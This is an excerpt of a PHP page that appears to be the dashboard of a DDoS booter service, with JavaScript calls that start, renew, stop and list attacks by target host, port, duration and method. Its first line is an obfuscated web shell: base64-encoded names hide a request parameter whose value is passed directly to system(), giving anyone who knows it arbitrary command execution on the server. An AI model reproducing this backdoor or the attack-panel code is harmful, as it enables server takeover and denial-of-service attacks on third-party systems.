...
<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
		...
		<script>
					...
					xmlhttp.open("GET","ajax/freehub.php?type=attacks",true);
					xmlhttp.send();
					...
					xmlhttp.open("GET","ajax/freehub.php?type=all" + "&host=" + host + "&port=" + port + "&time=" + time + "&method=" + method,true);
					xmlhttp.send();
					}			
					...
					xmlhttp.open("GET","ajax/freehub.php?type=renew" + "&id=" + id,true);
					xmlhttp.send();
					}
					...
					xmlhttp.open("GET","ajax/freehub.php?type=stop" + "&id=" + id,true);
					xmlhttp.send();
					}
					...
					xmlhttp.open("GET","ajax/freehub.php?type=adminattacks",true);
					xmlhttp.send();
					}
					</script>				 
 <body>
					...
					<div class="column main">
					  <div class="tabs is-centered">
						...
						<ul>
							...
							<span>Layer 4 | <?php echo $stats -> runningBoots($odb); ?></span>/<?php echo $maxattacks; ?></span>
							</a>
						  </li>
						  						</ul>
						<!--/tabs is-centered-->
